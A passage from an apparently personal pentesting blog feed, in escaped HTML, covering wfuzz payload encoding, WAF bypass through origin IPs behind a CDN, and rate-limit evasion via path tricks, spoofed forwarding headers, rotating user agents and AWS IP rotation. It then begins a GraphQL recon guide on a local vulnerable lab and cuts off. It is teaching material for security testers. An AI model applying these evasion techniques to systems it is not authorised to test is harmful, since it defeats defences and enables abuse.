+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;e&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;encoders&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Encode payload before it&amp;rsquo;s sent&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;file&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;wordlist&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;general&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;common&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//testphp.vulnweb.com/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;Multiple Encoders&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;wfuzz&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;z&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;md5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sha1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;none&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;http&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//webscantest.com/FUZZ
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;5---using-ip-address-instead-of-the-domain&#34;&gt;5 - Using IP Address instead of the domain&lt;/h3&gt;
+&lt;p&gt;Sometimes there could be some some &lt;em&gt;Subdomains&lt;/em&gt; and/or &lt;em&gt;endpoints&lt;/em&gt; that are protected by WAF :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110036.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;A very common way to bypass this is by using the IP Address instead of the domain , we can get the IP by using &lt;code&gt;Shodan&lt;/code&gt; extension&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_110452.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;But this IP is provided by a CDN (Cloudflare in this example), so it&amp;rsquo;s used by more that one host. Thus, we need to test all active ports until we find which one maps to the website we are testing.&lt;/p&gt;
+&lt;p&gt;Scenarios :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port      &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl target.com/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Forbidden &lt;span style=&#34;color:#ae81ff&#34;&gt;403&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl ip:port/protected/endpoint  &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&amp;gt; Success &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;CDNs &lt;strong&gt;sometimes&lt;/strong&gt; blocks access by IP Address to protect from this bypass technique&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_03_111118.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;6---rate-limits-testing&#34;&gt;6 - Rate Limits Testing&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;API providers may include its rate limiting details publicly on its website or in API documentation.&lt;/li&gt;
+&lt;li&gt;Check Headers&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;rate&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;limit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;remaining&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Other APIs won&amp;rsquo;t have an indication but once you exceed the limit you receive &lt;code&gt;429 Too Many Requests&lt;/code&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;Retry-After:&lt;/code&gt; Indicates when you can submit additional requests.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;How to test Rate Limiting ?&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; avoid being rate limited altogether&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; bypass the mechanism that is blocking you once you are rate limited (Blocked because of IP ? Auth Token ?)&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4 id=&#34;61---lax-rate-limits&#34;&gt;6.1 - Lax Rate Limits&lt;/h4&gt;
+&lt;p&gt;Let&amp;rsquo;s say &lt;code&gt;Rate limit  = 15 000 Request/min&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;-t&lt;/em&gt; option allows you to specify the concurrent &lt;strong&gt;number of connections&lt;/strong&gt;,
+&lt;em&gt;-s&lt;/em&gt; option allows you to specify a &lt;strong&gt;time delay&lt;/strong&gt; between requests.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_010914.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;This will send &lt;code&gt;12 000 Request/min&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;wfuzz -s 0.0005
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Or use Burp &lt;em&gt;Intruder&lt;/em&gt;/&lt;em&gt;Ressource Pool&lt;/em&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;th&gt;&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011645.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;td&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_011508.png&#34; alt=&#34;image&#34;&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h4 id=&#34;62---path-bypass&#34;&gt;6.2 - Path Bypass&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;If you reach the rate limit, try &lt;em&gt;Null Bytes&lt;/em&gt; , &lt;em&gt;Case&lt;/em&gt; &amp;amp;  &lt;em&gt;Meaningless Parameters&lt;/em&gt; at the end , this could :
+Restart the rate limit
+Bypass Rate limiting&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myProfile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;MyProfile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;my&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;profile&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If meaningless Parameters are restarting rate limiting just change parameter value in every request :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;api&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;myprofile&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;§&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Set the attack type to &lt;em&gt;pitchfork&lt;/em&gt; and use the same value for both payload positions.
+This tactic allows you to use the smallest number of requests required to brute-force the &lt;strong&gt;uid&lt;/strong&gt;.&lt;/p&gt;
+&lt;h4 id=&#34;63---origin-header-spoofing&#34;&gt;6.3 - Origin Header Spoofing&lt;/h4&gt;
+&lt;p&gt;Add these headers &lt;strong&gt;one by one&lt;/strong&gt; (If you include all headers at once, you may
+receive a 431 Request Header Fields Too Large status code)&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: 127.0.0.1
+X-Host: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Sometimes, &lt;strong&gt;User-Agent&lt;/strong&gt; header will be used in combination with other headers to help identify and block an attacker.&lt;/p&gt;
+&lt;p&gt;Use &lt;code&gt;SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt&lt;/code&gt; to cycle trough user-agents&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-ad-done&#34; data-lang=&#34;ad-done&#34;&gt;title: Bypassed 
+You’ll know you’ve succeeded if an `x-rate-limit` header **resets** or if you’re able to make successful requests after being blocked.
+&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;64---rotating-ip-addresses-in-burp-suite&#34;&gt;6.4 - Rotating IP Addresses in Burp Suite&lt;/h4&gt;
+&lt;p&gt;If WAF Blocks IP, Use &lt;em&gt;IP Rotate&lt;/em&gt; &lt;strong&gt;Burp Extension&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_122633.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Install &lt;em&gt;boto3&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pip3 install boto3
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Install &lt;em&gt;Jython&lt;/em&gt; for BurpSuite&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Install &lt;em&gt;IP Rotate&lt;/em&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;em&gt;Add User&lt;/em&gt; in aws -&amp;gt; IAM
+&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123117.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123340.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123417.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Create User&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_123526.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Download &lt;em&gt;CSV file&lt;/em&gt; containing your user’s &lt;strong&gt;access key&lt;/strong&gt; and &lt;strong&gt;secret access key&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;In Burp :&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://flowhero.github.io/assets/images/shemas/2023_08_01_124007.png&#34; alt=&#34;image&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Save Keys&lt;/em&gt; =&amp;gt; &lt;em&gt;Enable&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;Now, security controls that block you based solely on your IP address
+will stand no chance.&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Attacking GraphQL</title>
+      <link>https://flowhero.github.io/newblog/posts/graphql-exploitation/</link>
+      <pubDate>Wed, 02 Aug 2023 20:53:26 +0100</pubDate>
+      
+      <guid>https://flowhero.github.io/newblog/posts/graphql-exploitation/</guid>
+      <description>I - DVGA Use the following script to install &amp;amp; run DVGA :
+git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &amp;amp;&amp;amp; cd Damn-Vulnerable-GraphQL-Application docker build -t dvga . docker run -d -t -p 5013:5013 -e WEB_HOST=0.0.0.0 --name dvga dvga II - Toolkits nmap graphql-introspection Altair InQL SQLmap graphw00f III - Recon is GraphQL running ? What Endpoint ? What GraphQL Engine ? Attack Surface ? We can answer all these question using graphw00f :</description>
+      <content>&lt;h2 id=&#34;i---dvga&#34;&gt;I - DVGA&lt;/h2&gt;
+&lt;p&gt;Use the following script to install &amp;amp; run DVGA :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;git clone https://github.com/dolevf/Damn-Vulnerable-GraphQL-Application.git &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; cd Damn-Vulnerable-GraphQL-Application
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker build -t dvga .
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;docker run -d -t -p 5013:5013 -e WEB_HOST&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;0.0.0.0 --name dvga dvga
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;ii---toolkits&#34;&gt;II - Toolkits&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;em&gt;nmap&lt;/em&gt; &lt;strong&gt;graphql-introspection&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;Altair&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;InQL&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;SQLmap&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;&lt;em&gt;graphw00f&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;iii---recon&#34;&gt;III - Recon&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;is GraphQL running ?&lt;/li&gt;
+&lt;li&gt;What Endpoint ?&lt;/li&gt;
+&lt;li&gt;What GraphQL Engine ?&lt;/li&gt;
+&lt;li&gt;Attack Surface ?&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can answer all these question using &lt;code&gt;graphw00f&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;python3 main&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;py &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;d &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;f &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;t http:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;127.0.0.1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;1---detecting-endpoints&#34;&gt;1 - Detecting endpoints&lt;/h3&gt;
+&lt;p&gt;we can use &lt;code&gt;ffuf&lt;/code&gt; to fuzz for endpoints using this wordlist that holds common graphql endpoints&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ffuf -u http://localhost/FUZZ -w /home/hero/tools/graphql-tools/endpoints.txt
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;graphql
+graphiql
+v1/graphql
+v2/graphql
+v3/graphql
+v1/graphiql
+v2/graphiql
+v3/graphiql
+playground
+v1/playground
+v2/playground
+v3/playground
+api/v1/playground
+api/v2/playground
+api/v3/playground
+console
+api/graphql
+api/graphiql
+explorer
+api/v1/graphql
+api/v2/graphql
+api/v3/graphql
+api/v1/graphiql
+api/v2/graphiql
+api/v3/graphiql
+v1/graphql
+api/graphql
+v1/api/graphql
+graph
+v1/graph
+graphiql
+v1/graphiql
+console
+query
+graphql/console
+altair
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;2---introspection-scanning&#34;&gt;2 - Introspection scanning&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nmap --script&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;graphql-introspection -sV 127.0.0.1 -p &lt;span style=&#34;color:#ae81ff&#34;&gt;5013&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;When introspection is enabled, the entire GraphQL schema can be retrieved with a single query.
